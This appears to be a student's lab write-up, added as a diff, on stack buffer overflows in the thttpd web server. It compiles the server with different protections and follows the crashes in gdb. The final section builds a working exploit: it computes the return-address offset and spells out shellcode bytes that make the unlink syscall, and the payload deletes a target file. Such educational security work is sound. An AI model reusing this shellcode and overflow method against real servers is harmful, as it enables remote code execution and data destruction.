@@ -1,0 +1,253 @@
+1.
+which gcc
+      //this command was run to ensure the path was correct, /usr/local/cs/bin
+
+2.
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+      //This command was used to build sthttpd with the patch applied.
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address -static-libasan'
+mv src/thttpd src/thttpd-as
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+   //These commands were used to create the executables with the different options used to compile. The -static-libasan in the 2nd make was needed to prevent an error later on when runnning the executables with the ports.
+
+
+3.
+Ports:
+12472
+12473
+12474
+
+src/thttpd-sp -p 12472 -D
+src/thttpd-as -p 12473 -D
+src/thttpd-no -p 12474 -D
+    //These were used to initiate an http server with the appropriate ports
+
+4.
+echo bleh > src/foo.txt
+curl http://localhost:12472/foo.txt
+curl http://localhost:12473/foo.txt
+curl http://localhost:12474/foo.txt
+     //This was to test whether or not the above port commands worked
+
+
+5.
+In crashing the program: the config file foo.txt was filled with "debug " such that it was over 100 characters long, but less than 1000 characters long to crash the program.
+
+gdb src/thttpd-sp
+r -p 12472 -D -C foo.txt
+     //This began gdb on the thhtpd program and ran the config file that contained the text that would break the program. This file just contained a bunch of "debug " strings that consisted of over 100 characters.
+
+backtrace
+	//yielded:
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff6db0636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff6d19f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff6db4047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff6db4010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x00000000004e03e6 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x6564006775626564 in ?? ()
+#10 0x7562656400677562 in ?? ()
+#11 0x0067756265640067 in ?? ()
+#12 0x6564006775626564 in ?? ()
+#13 0x7562656400677562 in ?? ()
+#14 0x0067756265640067 in ?? ()
+#15 0x6564006775626564 in ?? ()
+#16 0x7562656400677562 in ?? ()
+#17 0x0067756265640067 in ?? ()
+#18 0x6564006775626564 in ?? ()
+#19 0x7562656400677562 in ?? ()
+#20 0x0067756265640067 in ?? ()
+#21 0x6564006775626564 in ?? ()
+#22 0x7562656400677562 in ?? ()
+#23 0x0067756265640067 in ?? ()
+#24 0x6564006775626564 in ?? ()
+#25 0x7562656400677562 in ?? ()
+#26 0x0067756265640067 in ?? ()
+#27 0x6564006775626564 in ?? ()
+
+break thttpd.c:1190
+r -p 12472 -D -C foo.txt
+stepi
+stepi
+stepi
+
+	//This assembly code instruction was jumped to after a jne assembly instruction earlier
+	
+0x00000000004e03e1 <read_config+1521>:       e8 0a 5a f2 ff  callq  0x405df0 <__stack_chk_fail@plt>
+	//This instruction called for the program to crash, due to the instruction before the jne instruction:
+
+0x00000000004e02b8 <read_config+1224>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+	//This is due to the detection of buffer overflow when the canary value is changed and compared to the canary value before. Since there was a change, it knows it was unexpectedly overwritten by the program, immediately crashing it.
+
+
+6.
+gdb src/thttpd-as
+r -p 12473 -D -C foo.txt
+backtrace
+
+	//The following is the output from the backtrace
+
+
+==46047==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffced4 at pc 0x00000043aec9 bp 0x7fffffffce30 sp 0x7fffffffc5e0
+READ of size 397 at 0x7fffffffced4 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+=> 0x00007ffff7075118:  80 39 48        cmpb   $0x48,(%rcx)
+(gdb) bt
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffbd50, pc=4435657,
+    max_depth=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342576,
+    pc=4435657, max_depth=256, stack=0x7fffffffbd50) at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342576, sp=sp@entry=140737488340448,
+    addr=addr@entry=140737488342740, is_write=is_write@entry=false, access_size=access_size@entry=397,
+    exp=<optimized out>, fatal=<optimized out>) at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, c=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x6564206775626564 in ?? ()
+#8  0x7562656420677562 in ?? ()
+#9  0x2067756265642067 in ?? ()
+#10 0x6564206775626564 in ?? ()
+#11 0x7562656420677562 in ?? ()
+#12 0x2067756265642067 in ?? ()
+#13 0x6564206775626564 in ?? ()
+#14 0x7562656420677562 in ?? ()
+#15 0x2067756265642067 in ?? ()
+#16 0x6564206775626564 in ?? ()
+#17 0x7562656420677562 in ?? ()
+#18 0x2067756265642067 in ?? ()
+#19 0x6564206775626564 in ?? ()
+#20 0x7562656420677562 in ?? ()
+#21 0x2067756265642067 in ?? ()
+#22 0x6564206775626564 in ?? ()
+
+break thttpd.c:1018
+r -p 12473 -D -C foo.txt
+
+  //The following were the assembly instructions from this line
+
+=> 0x00000000004e0b43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
+   0x00000000004e0b47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
+   0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>
+   0x00000000004e0b51 <read_config+193>:        48 85 c0        test   %rax,%rax
+   0x00000000004e0b54 <read_config+196>:        74 24   je     0x4e0b7a <read_config+234>
+
+
+si
+si
+ni
+	//These commands stepped through the first two assembly instructions, but when ni is called, which proceeds over the function call, the program crashes, meaning this assembly instruction,   0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>, threw the buffer overflow error with the address sanitizer. The resulting functions that this function calls executes the crash by the address sanitizer.
+	//The final instruction that ultimately crashed it was 0x00007ffff7075118:  80 39 48        cmpb   $0x48,(%rcx)
+
+
+7.
+gdb src/thttpd-no
+r -p 12474 -D -C foo.txt
+backtrace
+	//The following was the output of the backtrace
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+(gdb) bt
+#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x7562656400677562 in ?? ()
+#2  0x0067756265640067 in ?? ()
+#3  0x6564006775626564 in ?? ()
+#4  0x7562656400677562 in ?? ()
+#5  0x0067756265640067 in ?? ()
+#6  0x6564006775626564 in ?? ()
+#7  0x7562656400677562 in ?? ()
+
+set disassemble-next-line on
+break thttpd.c::1190
+r -p 12474 -D -C foo.txt
+
+  //The following are the assembly instructions for this line
+
+=> 0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
+   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
+   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
+   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
+   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
+   0x0000000000404d9f <read_config+1215>:       c3      retq
+
+   //on the last line, retq, the program crashes. This is due to the program accessing incorrect memory while the program had no previous detection to prevent the buffer overflow which occurred here.
+
+
+8.
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fsanitize=address -static-libasan'
+mv src/tthpd.o src/thttpd-as.s
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+   //These commands generated three files of the assembly code for each case
+   //Right off the bat, we examine the metadata to see that -no and -sp have relatively the same size and thus around the same number of instructions. The -as assembly code is more than 2 times the size of each of the other ones, indicating a lot more assembly instructions and checking and dealing with buffer overflow for fsanitize.
+   //By comparing the files in emacs, I observed that the -sp and -no assembly code for handler_read was exactly the same; this is most likely due to a local array not being declared from the function, as -fstack-protector-strong only generates canaries to be checked against when a local array is declared. This means it makes sense for the assembly code to be similar between the two.
+   //The difference between the -as and the other options is the assembly instructions in the handle_read. In -as, there is a constant check in the handle_read code for whether or not memory around the buffer has been tampered with or not. If it sees that the memory is different than expected, it throws an error and crashes the program. This constant checking causes the large amount of assembly code.
+
+9.
+To start building the exploit, I first normally ran thttpd-no with gdb
+
+gdb src/thttpd-no
+break read_config
+r -p 12474 -D -C foo.txt
+p &line
+	//A breakpoint was set at read_config because this function contains fgets which takes in 1000 characters while only 100 can only be handled
+	//p &line gives us the base address of the array, which outputs:
+$1 = (char (*)[100]) 0x7fffffffcfd0
+     	//This is d0 cf ff ff ff 7f 00 00 in little endian
+continue
+info registers
+	//This ended up crashing the program again, but with this, we can see the rsp value at this point and compare it to the rsp value above.
+
+0x7fffffffd068-0x7fffffffcfd0=0x98
+	//This is equal to 152, so the config file needs to be 152 characters long.
+	//We need the hex value of the target.txt file name, so we can use an online string-> hex converter to do that, with the last byte being the end byte, yielding:
+
+74 61 72 67 65 74 2e 74 78 74 00
+      	 //We want to put this value at the start of our return address, so we take the final rsp value from before and subtract 11 from it, yielding
+0x7fffffffd05D
+
+	//Next we want the object code for removing/unlinking a file such that it can be used in the exploit. First the address of our filename cstring has to be moved into register rdi because that is the register being used when unlink is called. From looking at the assembly code of the function unlink().
+
+48 bf a0 cf ff ff ff 7f 00 00
+   //Moving the address into rdi
+b8 57 00 00 00 0f 05
+   //Calling the the syscall to delete the file
+
+Putting these together, we have
+48 bf a0 cf ff ff ff 7f 00 00 b8 57 00 00 00 0f 05
+
+Since we have 152 characters needing to be filled, we need to fill in the rest of the config file with 00 bytes.
+
+48 bf a0 cf ff ff ff 7f 00 00 b8 57 00 00 00 0f 05 00 00 00 00 00... 74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00 d0 cf ff ff ff 7f 00 00
+
+   //The ... is the number of 00 characters needed left after all these exploit, name, and address bytes.
+   //This hex file was converted to a raw file, delete.txt
+
+gdb thttpd-no
+r -p 12474 -D -C delete.txt
+  //This caused the target.txt in my patch folder to be deleted due to the buffer overflow exploit.
